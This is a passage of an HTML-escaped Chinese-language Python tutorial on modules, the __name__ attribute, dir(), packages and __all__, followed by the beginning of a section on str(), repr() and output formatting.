&lt;h3 id=&#34;from-…-import-语句-1&#34;&gt;&lt;a href=&#34;#from-…-import-语句-1&#34; class=&#34;headerlink&#34; title=&#34;from … import * 语句&#34;&gt;&lt;/a&gt;from … import * 语句&lt;/h3&gt;&lt;p&gt;把一个模块的所有内容全都导入到当前的命名空间&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; modname &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;深入模式&#34;&gt;&lt;a href=&#34;#深入模式&#34; class=&#34;headerlink&#34; title=&#34;深入模式&#34;&gt;&lt;/a&gt;深入模式&lt;/h3&gt;&lt;p&gt;模块除了方法定义，还可以包括可执行的代码。这些代码一般用来初始化这个模块。这些代码只有在第一次被导入时才会被执行。每个模块有各自独立的符号表，在模块内部为所有的函数当作全局符号表来使用。&lt;/p&gt;
&lt;p&gt;导入模块的全局变量和本模块的全局变量是不影响的&lt;/p&gt;
&lt;h3 id=&#34;name-属性&#34;&gt;&lt;a href=&#34;#name-属性&#34; class=&#34;headerlink&#34; title=&#34;__name__属性&#34;&gt;&lt;/a&gt;__name__属性&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;用__name__属性来使该程序块仅在该模块自身运行时执行&lt;/li&gt;
&lt;li&gt;每个模块都有一个__name__属性，当其值是’&lt;strong&gt;main&lt;/strong&gt;‘时，表明该模块自身在运行，否则是被引入&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;name&lt;/strong&gt;&lt;/strong&gt; 与 &lt;strong&gt;&lt;strong&gt;main&lt;/strong&gt;&lt;/strong&gt; 底下是双下划线， &lt;strong&gt;_ _&lt;/strong&gt; 是这样去掉中间的那个空格&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;程序自身在运行&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;我来自另一模块&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;python using_name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;py
程序自身在运行

&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; using_name
我来自另一模块&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;dir-函数&#34;&gt;&lt;a href=&#34;#dir-函数&#34; class=&#34;headerlink&#34; title=&#34;dir()函数&#34;&gt;&lt;/a&gt;dir()函数&lt;/h3&gt;&lt;p&gt;内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[&#39;__breakpointhook__&#39;, &#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__interactivehook__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;__unraisablehook__&#39;, &#39;_base_executable&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_debugmallocstats&#39;, &#39;_enablelegacywindowsfsencoding&#39;, &#39;_framework&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;_home&#39;, &#39;_xoptions&#39;, &#39;addaudithook&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;audit&#39;, &#39;base_exec_prefix&#39;, &#39;base_prefix&#39;, &#39;breakpointhook&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dllhandle&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_info&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;get_asyncgen_hooks&#39;, &#39;get_coroutine_origin_tracking_depth&#39;, &#39;getallocatedblocks&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getfilesystemencodeerrors&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;getswitchinterval&#39;, &#39;gettrace&#39;, &#39;getwindowsversion&#39;, &#39;hash_info&#39;, &#39;hexversion&#39;, &#39;implementation&#39;, &#39;int_info&#39;, &#39;intern&#39;, &#39;is_finalizing&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;pycache_prefix&#39;, &#39;set_asyncgen_hooks&#39;, &#39;set_coroutine_origin_tracking_depth&#39;, &#39;setcheckinterval&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;setswitchinterval&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;thread_info&#39;, &#39;unraisablehook&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;, &#39;winver&#39;]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果没有给定参数，那么 dir() 函数会罗列出当前定义的所有名称&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[&#39;__annotations__&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;i&#39;, &#39;sys&#39;]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;标准模块&#34;&gt;&lt;a href=&#34;#标准模块&#34; class=&#34;headerlink&#34; title=&#34;标准模块&#34;&gt;&lt;/a&gt;标准模块&lt;/h3&gt;&lt;p&gt;Python 本身带着一些标准的模块库，有些模块直接被构建在解析器里&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;包&#34;&gt;&lt;a href=&#34;#包&#34; class=&#34;headerlink&#34; title=&#34;包&#34;&gt;&lt;/a&gt;包&lt;/h3&gt;&lt;p&gt;包是一种管理 Python 模块命名空间的形式，采用”点模块名称”，比如一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B，例如 &lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;sound/                          顶层包
      __init__.py               初始化 sound 包
      formats/                  文件格式转换子包
              __init__.py
              wavread.py
              wavwrite.py
              aiffread.py
              aiffwrite.py
              auread.py
              auwrite.py
              &lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.
      effects/                  声音效果子包
              __init__.py
              echo.py
              surround.py
              reverse.py
              &lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.
      filters/                  filters 子包
              __init__.py
              equalizer.py
              vocoder.py
              karaoke.py
              &lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;目录只有包含一个叫做 &lt;strong&gt;init&lt;/strong&gt;.py 的文件才会被认作是一个包&lt;/li&gt;
&lt;li&gt;使用形如 &lt;strong&gt;import item.subitem.subsubitem&lt;/strong&gt; 这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sound&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;effects&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;echo
&lt;span class=&#34;token comment&#34;&gt;# 导入包里的特定模块&lt;/span&gt;
sound&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;effects&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;echo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;echofilter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; delay&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; atten&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sound&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;effects &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; echo
&lt;span class=&#34;token comment&#34;&gt;# 导入子模块的方法&lt;/span&gt;
echo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;echofilter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; delay&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; atten&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sound&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;effects&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;echo &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; echofilter
&lt;span class=&#34;token comment&#34;&gt;# 直接导入一个函数或者变量&lt;/span&gt;
echofilter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; delay&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; atten&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; package &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; item
&lt;span class=&#34;token comment&#34;&gt;#import 语法会首先把 item 当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，抛出一个 :exc:ImportError 异常。&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;从一个包中导入&#34;&gt;&lt;a href=&#34;#从一个包中导入&#34; class=&#34;headerlink&#34; title=&#34;从一个包中导入*&#34;&gt;&lt;/a&gt;从一个包中导入*&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;如果包定义文件 &lt;strong&gt;_&lt;em&gt;init&lt;/em&gt;_.py&lt;/strong&gt; 存在一个叫做 &lt;strong&gt;_&lt;em&gt;all&lt;/em&gt;_&lt;/strong&gt; 的列表变量，那么在使用 &lt;strong&gt;from package import *&lt;/strong&gt; 的时候就把这个列表中的所有名字作为包内容导入&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;__all__ &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;echo&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;surround&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;reverse&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果 &lt;strong&gt;&lt;strong&gt;all&lt;/strong&gt;&lt;/strong&gt; 没有定义，那么使用**from sound.effects import ***这种语法的时候，就不会导入包 sound.effects 里的任何子模块&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;包还提供一个额外的属性__path__。这是一个目录列表，里面每一个包含的目录都有为这个包服务的__init__.py&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;输入输出&#34;&gt;&lt;a href=&#34;#输入输出&#34; class=&#34;headerlink&#34; title=&#34;输入输出&#34;&gt;&lt;/a&gt;输入输出&lt;/h2&gt;&lt;h3 id=&#34;输入格式美化&#34;&gt;&lt;a href=&#34;#输入格式美化&#34; class=&#34;headerlink&#34; title=&#34;输入格式美化&#34;&gt;&lt;/a&gt;输入格式美化&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;print()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;write()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sys.stdout&lt;/code&gt;标准输出文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;str.format()&lt;/code&gt;多样化&lt;/li&gt;
&lt;li&gt;&lt;code&gt;str()&lt;/code&gt;用户易读&lt;/li&gt;
&lt;li&gt;&lt;code&gt;repr&lt;/code&gt;解释器易读&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# &#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 0.14285714285714285&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 0.14285714285714285&lt;/span&gt;
s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test\nhaha&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
test
haha
&#39;&#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
test
haha
&#39;&#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# repr将转义字符当做字符执行&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# &#39;test\nhaha&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 注意括号&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (&#39;test\nhaha&#39;, [1, 2])&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# repr接收python所有类型&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 输出平方与立方表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rjust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rjust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;# 注意前一行 &#39;end&#39; 的使用&lt;/span&gt;
